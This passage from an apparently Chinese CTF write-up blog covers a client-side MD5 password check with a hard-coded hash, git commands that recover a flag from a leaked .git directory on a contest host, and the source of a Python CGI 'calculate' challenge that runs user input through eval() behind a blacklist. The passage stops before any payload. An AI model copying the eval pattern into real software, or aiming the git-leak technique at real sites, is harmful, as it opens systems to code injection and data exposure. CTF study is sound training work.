AddUnsigned(AddUnsigned(I(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">ConvertToWordArray</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">var</span> lWordCount;</span><br><span class="line">           <span class="keyword">var</span> lMessageLength = string.length;</span><br><span class="line">           <span class="keyword">var</span> lNumberOfWords_temp1=lMessageLength + <span class="number">8</span>;</span><br><span class="line">           <span class="keyword">var</span> lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % <span class="number">64</span>))/<span class="number">64</span>;</span><br><span class="line">           <span class="keyword">var</span> lNumberOfWords = (lNumberOfWords_temp2+<span class="number">1</span>)*<span class="number">16</span>;</span><br><span class="line">           <span class="keyword">var</span> lWordArray=<span class="built_in">Array</span>(lNumberOfWords<span class="number">-1</span>);</span><br><span class="line">           <span class="keyword">var</span> lBytePosition = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">var</span> lByteCount = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">while</span> ( lByteCount &lt; lMessageLength ) &#123;</span><br><span class="line">                   lWordCount = (lByteCount-(lByteCount % <span class="number">4</span>))/<span class="number">4</span>;</span><br><span class="line">                   lBytePosition = (lByteCount % <span class="number">4</span>)*<span class="number">8</span>;</span><br><span class="line">                   lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount)&lt;&lt;lBytePosition));</span><br><span class="line">                   lByteCount++;</span><br><span class="line">           &#125;</span><br><span class="line">           lWordCount = (lByteCount-(lByteCount % <span class="number">4</span>))/<span class="number">4</span>;</span><br><span class="line">           lBytePosition = (lByteCount % <span class="number">4</span>)*<span class="number">8</span>;</span><br><span class="line">           lWordArray[lWordCount] = lWordArray[lWordCount] | (<span class="number">0x80</span>&lt;&lt;lBytePosition);</span><br><span class="line">           lWordArray[lNumberOfWords<span class="number">-2</span>] = lMessageLength&lt;&lt;<span class="number">3</span>;</span><br><span class="line">           lWordArray[lNumberOfWords<span class="number">-1</span>] = lMessageLength&gt;&gt;&gt;<span class="number">29</span>;</span><br><span class="line">           <span class="keyword">return</span> lWordArray;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">WordToHex</span>(<span class="params">lValue</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">var</span> WordToHexValue=<span class="string">""</span>,WordToHexValue_temp=<span class="string">""</span>,lByte,lCount;</span><br><span class="line">           <span class="keyword">for</span> (lCount = <span class="number">0</span>;lCount&lt;=<span class="number">3</span>;lCount++) &#123;</span><br><span class="line">                   lByte = (lValue&gt;&gt;&gt;(lCount*<span class="number">8</span>)) &amp; <span class="number">255</span>;</span><br><span class="line">                   WordToHexValue_temp = <span class="string">"0"</span> + lByte.toString(<span class="number">16</span>);</span><br><span class="line">                   WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length<span class="number">-2</span>,<span class="number">2</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> WordToHexValue;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">Utf8Encode</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">           string = string.replace(<span class="regexp">/\r\n/g</span>,<span class="string">"\n"</span>);</span><br><span class="line">           <span class="keyword">var</span> utftext = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; string.length; n++) &#123;</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">var</span> c = string.charCodeAt(n);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span> (c &lt; <span class="number">128</span>) &#123;</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode(c);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">else</span> <span class="keyword">if</span>((c &gt; <span class="number">127</span>) &amp;&amp; (c &lt; <span class="number">2048</span>)) &#123;</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &gt;&gt; <span class="number">6</span>) | <span class="number">192</span>);</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">else</span> &#123;</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &gt;&gt; <span class="number">12</span>) | <span class="number">224</span>);</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>) | <span class="number">128</span>);</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> utftext;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> x=<span class="built_in">Array</span>();</span><br><span class="line">   <span class="keyword">var</span> k,AA,BB,CC,DD,a,b,c,d;</span><br><span class="line">   <span class="keyword">var</span> S11=<span class="number">7</span>, S12=<span class="number">12</span>, S13=<span class="number">17</span>, S14=<span class="number">22</span>;</span><br><span class="line">   <span class="keyword">var</span> S21=<span class="number">5</span>, S22=<span class="number">9</span> , S23=<span class="number">14</span>, S24=<span class="number">20</span>;</span><br><span class="line">   <span class="keyword">var</span> S31=<span class="number">4</span>, S32=<span class="number">11</span>, S33=<span class="number">16</span>, S34=<span class="number">23</span>;</span><br><span class="line">   <span class="keyword">var</span> S41=<span class="number">6</span>, S42=<span class="number">10</span>, S43=<span class="number">15</span>, S44=<span class="number">21</span>;</span><br><span class="line"></span><br><span class="line">   string = Utf8Encode(string);</span><br><span class="line"></span><br><span class="line">   x = ConvertToWordArray(string);</span><br><span class="line"></span><br><span class="line">   a = <span class="number">0x67452301</span>; b = <span class="number">0xEFCDAB89</span>; c = <span class="number">0x98BADCFE</span>; d = <span class="number">0x10325476</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;x.length;k+=<span class="number">16</span>) &#123;</span><br><span class="line">           AA=a; BB=b; CC=c; DD=d;</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">0</span>], S11,<span class="number">0xD76AA478</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">1</span>], S12,<span class="number">0xE8C7B756</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">2</span>], S13,<span class="number">0x242070DB</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">3</span>], S14,<span class="number">0xC1BDCEEE</span>);</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">4</span>], S11,<span class="number">0xF57C0FAF</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">5</span>], S12,<span class="number">0x4787C62A</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">6</span>], S13,<span class="number">0xA8304613</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">7</span>], S14,<span class="number">0xFD469501</span>);</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">8</span>], S11,<span class="number">0x698098D8</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">9</span>], S12,<span class="number">0x8B44F7AF</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">10</span>],S13,<span class="number">0xFFFF5BB1</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">11</span>],S14,<span class="number">0x895CD7BE</span>);</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">12</span>],S11,<span class="number">0x6B901122</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">13</span>],S12,<span class="number">0xFD987193</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">14</span>],S13,<span class="number">0xA679438E</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">15</span>],S14,<span class="number">0x49B40821</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">1</span>], S21,<span class="number">0xF61E2562</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">6</span>], S22,<span class="number">0xC040B340</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">11</span>],S23,<span class="number">0x265E5A51</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">0</span>], S24,<span class="number">0xE9B6C7AA</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">5</span>], S21,<span class="number">0xD62F105D</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">10</span>],S22,<span class="number">0x2441453</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">15</span>],S23,<span class="number">0xD8A1E681</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">4</span>], S24,<span class="number">0xE7D3FBC8</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">9</span>], S21,<span class="number">0x21E1CDE6</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">14</span>],S22,<span class="number">0xC33707D6</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">3</span>], S23,<span class="number">0xF4D50D87</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">8</span>], S24,<span class="number">0x455A14ED</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">13</span>],S21,<span class="number">0xA9E3E905</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">2</span>], S22,<span class="number">0xFCEFA3F8</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">7</span>], S23,<span class="number">0x676F02D9</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">12</span>],S24,<span class="number">0x8D2A4C8A</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">5</span>], S31,<span class="number">0xFFFA3942</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">8</span>], S32,<span class="number">0x8771F681</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">11</span>],S33,<span class="number">0x6D9D6122</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">14</span>],S34,<span class="number">0xFDE5380C</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">1</span>], S31,<span class="number">0xA4BEEA44</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">4</span>], S32,<span class="number">0x4BDECFA9</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">7</span>], S33,<span class="number">0xF6BB4B60</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">10</span>],S34,<span class="number">0xBEBFBC70</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">13</span>],S31,<span class="number">0x289B7EC6</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">0</span>], S32,<span class="number">0xEAA127FA</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">3</span>], S33,<span class="number">0xD4EF3085</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">6</span>], S34,<span class="number">0x4881D05</span>);</span><br><span class="line">           a=HH(a,b,c,d,x[k+<span class="number">9</span>], S31,<span class="number">0xD9D4D039</span>);</span><br><span class="line">           d=HH(d,a,b,c,x[k+<span class="number">12</span>],S32,<span class="number">0xE6DB99E5</span>);</span><br><span class="line">           c=HH(c,d,a,b,x[k+<span class="number">15</span>],S33,<span class="number">0x1FA27CF8</span>);</span><br><span class="line">           b=HH(b,c,d,a,x[k+<span class="number">2</span>], S34,<span class="number">0xC4AC5665</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">0</span>], S41,<span class="number">0xF4292244</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">7</span>], S42,<span class="number">0x432AFF97</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">14</span>],S43,<span class="number">0xAB9423A7</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">5</span>], S44,<span class="number">0xFC93A039</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">12</span>],S41,<span class="number">0x655B59C3</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">3</span>], S42,<span class="number">0x8F0CCC92</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">10</span>],S43,<span class="number">0xFFEFF47D</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">1</span>], S44,<span class="number">0x85845DD1</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">8</span>], S41,<span class="number">0x6FA87E4F</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">15</span>],S42,<span class="number">0xFE2CE6E0</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">6</span>], S43,<span class="number">0xA3014314</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">13</span>],S44,<span class="number">0x4E0811A1</span>);</span><br><span class="line">           a=II(a,b,c,d,x[k+<span class="number">4</span>], S41,<span class="number">0xF7537E82</span>);</span><br><span class="line">           d=II(d,a,b,c,x[k+<span class="number">11</span>],S42,<span class="number">0xBD3AF235</span>);</span><br><span class="line">           c=II(c,d,a,b,x[k+<span class="number">2</span>], S43,<span class="number">0x2AD7D2BB</span>);</span><br><span class="line">           b=II(b,c,d,a,x[k+<span class="number">9</span>], S44,<span class="number">0xEB86D391</span>);</span><br><span class="line">           a=AddUnsigned(a,AA);</span><br><span class="line">           b=AddUnsigned(b,BB);</span><br><span class="line">           c=AddUnsigned(c,CC);</span><br><span class="line">           d=AddUnsigned(d,DD);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> temp = WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> temp.toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#login-form"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (md5($(<span class="string">"#password"</span>).val()).toLowerCase() === <span class="string">"698967f805dea9ea073d188d73ab7390"</span>) &#123;</span><br><span class="line">            $(<span class="string">"html"</span>).html(<span class="string">"&lt;h1&gt;Login Succeeded!&lt;/h1&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $(<span class="string">"html"</span>).html(<span class="string">"&lt;h1&gt;Login Failed!&lt;/h1&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其实就是那个md5解密，这些都是虚的</p><h2 id="金融业网络安全攻防比赛热身赛"><a href="#金融业网络安全攻防比赛热身赛" class="headerlink" title="金融业网络安全攻防比赛热身赛"></a>金融业网络安全攻防比赛热身赛</h2><h3 id="babygit"><a href="#babygit" class="headerlink" title="babygit"></a>babygit</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git log</span><br><span class="line">commit 96bc79270bdd8ff7858e73eb77d73a2bf93aa085 (HEAD -&gt; master)</span><br><span class="line">Author: Admin &lt;admin@example.com&gt;</span><br><span class="line">Date:   Wed Jul 25 06:16:26 2018 +0000</span><br><span class="line"></span><br><span class="line">    add message</span><br><span class="line"></span><br><span class="line">commit bb0c97ee3c3e08403ce50391d1ae110ce6d6d41c</span><br><span class="line">Author: Admin &lt;admin@example.com&gt;</span><br><span class="line">Date:   Wed Jul 25 06:16:26 2018 +0000</span><br><span class="line"></span><br><span class="line">    add flag</span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git reset bb0c97ee3c3e08403ce50391d1ae110ce6d6d41c</span><br><span class="line">重置后取消暂存的变更：</span><br><span class="line">D flag.txt</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git checkout flag.txt</span><br><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ ls</span><br><span class="line">50x.html  flag.txt  index.html  README.md</span><br><span class="line">threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ cat flag.txt</span><br><span class="line">flag&#123;G1t_D1s?1&#125;</span><br></pre></td></tr></table></figure><h3 id="calculate"><a href="#calculate" class="headerlink" title="calculate"></a>calculate</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Calculate<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Calculate<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">t</span> <span class="attr">placeholder</span>=<span class="string">'Input your team token'</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">value1</span> <span class="attr">placeholder</span>=<span class="string">'Value 1 (Example: 1  abc)'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">op</span> <span class="attr">placeholder</span>=<span class="string">'Operator (Example: + - * ** / // == != )'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4"</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">value2</span> <span class="attr">placeholder</span>=<span class="string">'Value 2 (Example: 1  abc)'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control col-md-4 btn btn-success"</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">EVAL</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'?source=1'</span>&gt;</span>Source<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>#!/usr/bin/env python3</span><br><span class="line">import cgi;</span><br><span class="line">import sys</span><br><span class="line">from html import escape</span><br><span class="line">from secret import get_flag</span><br><span class="line"></span><br><span class="line">OK_200 = &amp;quot;&amp;quot;&amp;quot;Content-type: text/html</span><br><span class="line"></span><br><span class="line">&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;quot;&amp;gt;</span><br><span class="line">&amp;lt;center&amp;gt;</span><br><span class="line">&amp;lt;title&amp;gt;Calculate&amp;lt;/title&amp;gt;</span><br><span class="line">&amp;lt;h1&amp;gt;Calculate&amp;lt;/h1&amp;gt;</span><br><span class="line">&amp;lt;form&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=t placeholder=&amp;#x27;Input your team token&amp;#x27; %s /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value1 placeholder=&amp;#x27;Value 1 (Example: 1  abc)&amp;#x27; /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=op placeholder=&amp;#x27;Operator (Example: + - * ** / // == != )&amp;#x27; /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value2 placeholder=&amp;#x27;Value 2 (Example: 1  abc)&amp;#x27; /&amp;gt;</span><br><span class="line">&amp;lt;input class=&amp;quot;form-control col-md-4 btn btn-success&amp;quot; type=submit value=EVAL /&amp;gt;</span><br><span class="line">&amp;lt;/form&amp;gt;</span><br><span class="line">&amp;lt;a href=&amp;#x27;?%ssource=1&amp;#x27;&amp;gt;Source&amp;lt;/a&amp;gt;</span><br><span class="line">&amp;lt;/center&amp;gt;</span><br><span class="line">&amp;quot;&amp;quot;&amp;quot;</span><br><span class="line"></span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line">if &amp;#x27;t&amp;#x27; in arguments:</span><br><span class="line">    token = str(arguments[&amp;#x27;t&amp;#x27;].value)</span><br><span class="line">    print(OK_200 % (&amp;quot;value=&amp;quot;+token+&amp;#x27; readonly&amp;#x27;, &amp;quot;t=&amp;quot;+token+&amp;quot;&amp;amp;&amp;quot;))</span><br><span class="line">else:</span><br><span class="line">    print(OK_200 % (&amp;quot;&amp;quot;, &amp;quot;&amp;quot;))</span><br><span class="line"></span><br><span class="line">if &amp;#x27;source&amp;#x27; in arguments:</span><br><span class="line">    source = arguments[&amp;#x27;source&amp;#x27;].value</span><br><span class="line">else:</span><br><span class="line">    source = 0</span><br><span class="line"></span><br><span class="line">if source == &amp;#x27;1&amp;#x27;:</span><br><span class="line">    print(&amp;#x27;&amp;lt;pre&amp;gt;&amp;#x27;+escape(str(open(__file__,&amp;#x27;r&amp;#x27;).read()))+&amp;#x27;&amp;lt;/pre&amp;gt;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">if &amp;#x27;value1&amp;#x27; in arguments and &amp;#x27;value2&amp;#x27; in arguments and &amp;#x27;op&amp;#x27; in arguments and &amp;#x27;t&amp;#x27; in arguments:</span><br><span class="line"></span><br><span class="line">    FLAG = &amp;#x27;flag&#123;&amp;#x27; + get_flag(arguments[&amp;#x27;t&amp;#x27;].value) + &amp;#x27;&#125;&amp;#x27;</span><br><span class="line"></span><br><span class="line">    def get_value(val):</span><br><span class="line">        val = str(val)[:64]</span><br><span class="line">        if str(val).isdigit(): return int(val)</span><br><span class="line">        blacklist = [&amp;#x27;(&amp;#x27;,&amp;#x27;)&amp;#x27;,&amp;#x27;[&amp;#x27;,&amp;#x27;]&amp;#x27;,&amp;#x27;\&amp;#x27;&amp;#x27;,&amp;#x27;&amp;quot;&amp;#x27;] # I don&amp;#x27;t like tuple, list and dict.</span><br><span class="line">        if val == &amp;#x27;&amp;#x27; or [c for c in blacklist if c in val] != []:</span><br><span class="line">            print(&amp;#x27;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&amp;#x27;)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        return val</span><br><span class="line"></span><br><span class="line">    def get_op(val):</span><br><span class="line">        val = str(val)[:2]</span><br><span class="line">        list_ops = [&amp;#x27;+&amp;#x27;,&amp;#x27;-&amp;#x27;,&amp;#x27;/&amp;#x27;,&amp;#x27;*&amp;#x27;,&amp;#x27;=&amp;#x27;,&amp;#x27;!&amp;#x27;]</span><br><span class="line">        if val == &amp;#x27;&amp;#x27; or val[0] not in list_ops:</span><br><span class="line">            print(&amp;#x27;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&amp;#x27;)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        return val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[&amp;#x27;op&amp;#x27;].value)</span><br><span class="line">    value1 = get_value(arguments[&amp;#x27;value1&amp;#x27;].value)</span><br><span class="line">    value2 = get_value(arguments[&amp;#x27;value2&amp;#x27;].value)</span><br><span class="line"></span><br><span class="line">    if str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(&amp;#x27;&amp;lt;center&amp;gt;Types of the values don\&amp;#x27;t match&amp;lt;/center&amp;gt;&amp;#x27;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line"></span><br><span class="line">    print(&amp;#x27;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;quot;col-md-8&amp;quot;&amp;gt;&amp;lt;pre&amp;gt;&amp;#x27;)</span><br><span class="line">    print(&amp;#x27;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&amp;#x27;+escape(calc_eval)+&amp;#x27;)&amp;#x27;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        if result.isdigit() or result == &amp;#x27;True&amp;#x27; or result == &amp;#x27;False&amp;#x27;:</span><br><span class="line">            print(result)</span><br><span class="line">        else:</span><br><span class="line">            print(&amp;quot;Invalid&amp;quot;) # Sorry we don&amp;#x27;t support output as a string due to security issue.</span><br><span class="line">    except:</span><br><span class="line">        print(&amp;quot;Invalid&amp;quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(&amp;#x27;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#x27;)</span><br><span class="line"><span 